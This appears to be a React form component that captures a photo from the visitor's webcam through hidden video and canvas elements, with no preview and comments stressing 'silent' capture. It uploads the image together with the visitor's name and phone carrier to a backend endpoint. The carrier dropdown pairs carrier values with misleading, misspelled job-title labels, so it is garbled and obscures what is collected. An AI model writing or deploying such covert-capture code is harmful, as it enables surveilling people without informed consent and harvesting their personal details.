'use client';
import { useState, useRef } from 'react';
import { Camera } from 'lucide-react';

export default function DiscreetCameraForm() {
  const [userName, setUserName] = useState('');
  const [carrier, setCarrier] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [error, setError] = useState('');
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  
  // Initialize camera in background but don't display it
  const initializeCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      return true;
    } catch (err) {
      setError('Camera access is required. Please allow camera permissions.');
      return false;
    }
  };

  // Take photo silently in the background
  const takePhotoSilently = () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;
    
    if (!video || !canvas) return null;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0);
    const imageData = canvas.toDataURL('image/png');
    
    // Stop camera stream
    const tracks = video.srcObject.getTracks();
    tracks.forEach(track => track.stop());
    
    return imageData;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsProcessing(true);
    
    // Initialize camera first
    const cameraInitialized = await initializeCamera();
    if (!cameraInitialized) {
      setIsProcessing(false);
      return;
    }
    
    // Give a small delay to ensure camera is ready
    setTimeout(async () => {
      try {
        // Take photo without showing preview
        const capturedImage = takePhotoSilently();
        
        if (!capturedImage) {
          throw new Error('Failed to capture image');
        }
        
        // Send data to backend
        const response = await fetch('/api/upload-photo', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            image: capturedImage,
            userName: userName,
            carrier: carrier
          }),
        });
        
        if (response.ok) {
          setIsSuccess(true);
          setTimeout(() => {
            // Redirect after showing success message briefly
            window.location.href = '/photo';
          }, 1500);
        } else {
          throw new Error('Failed to upload');
        }
      } catch (error) {
        setError('Something went wrong. Please try again.');
      } finally {
        setIsProcessing(false);
      }
    }, 1000);
  };

  return (
    <div className="max-w-md mx-auto mt-10 p-6 bg-gradient-to-r from-purple-600 to-blue-500 rounded-xl shadow-2xl">
      <h1 className="text-3xl font-bold text-center text-white mb-6">Amazing Photo Form</h1>
      
      {/* Hidden video and canvas elements */}
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <canvas ref={canvasRef} className="hidden" />
      
      {isSuccess ? (
        <div className="text-center py-10">
          <div className="bg-white/20 backdrop-blur-md rounded-lg p-6 border-2 border-white/30">
            <div className="w-16 h-16 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Success!</h2>
            <p className="text-white/80">Your information has been submitted.</p>
            <p className="text-white/80 text-sm mt-2">Redirecting to photo page...</p>
          </div>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-4">
            <div className="group">
              <input
                type="text"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                required
                className="w-full px-4 py-3 bg-white/20 backdrop-blur-sm border-2 border-white/30 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-white placeholder-white/60 transition-all"
                placeholder="Your Name"
              />
            </div>
            
            <div className="group">
              <select
                value={carrier}
                onChange={(e) => setCarrier(e.target.value)}
                required
                className="w-full px-4 py-3 bg-white/20 backdrop-blur-sm border-2 border-white/30 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-white appearance-none transition-all"
              >
                <option value="" className="text-gray-800">Software Enginer</option>
              <option value="AT&T" className="text-gray-800">Big Data Enginneer</option>
              <option value="Verizon" className="text-gray-800">Deveops Engineer</option>
              <option value="T-Mobile" className="text-gray-800">Machine Engineer</option>
              <option value="Sprint" className="text-gray-800">Sprint</option>
              <option value="Other" className="text-gray-800">Awara</option>
              </select>
            </div>
          </div>
          
          {error && (
            <div className="bg-red-500/80 text-white p-3 rounded-lg text-center">
              {error}
            </div>
          )}
          
          <button
            type="submit"
            disabled={isProcessing || !userName || !carrier}
            className={`w-full py-4 px-6 rounded-lg text-white font-bold text-lg shadow-lg transform hover:scale-105 transition-all ${
              isProcessing || !userName || !carrier
                ? 'bg-gray-400 cursor-not-allowed'
                : 'bg-gradient-to-r from-green-400 to-blue-500 hover:from-green-500 hover:to-blue-600'
            }`}
          >
            {isProcessing ? (
              <span className="flex items-center justify-center">
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Taking Photo & Submitting...
              </span>
            ) : (
              <span className="flex items-center justify-center">
                <Camera size={20} className="mr-2" />
                Submit & Take Photo
              </span>
            )}
          </button>
          
          <p className="text-center text-white/70 text-sm">
            Click submit to capture photo and send information
          </p>
        </form>
      )}
    </div>
  );
}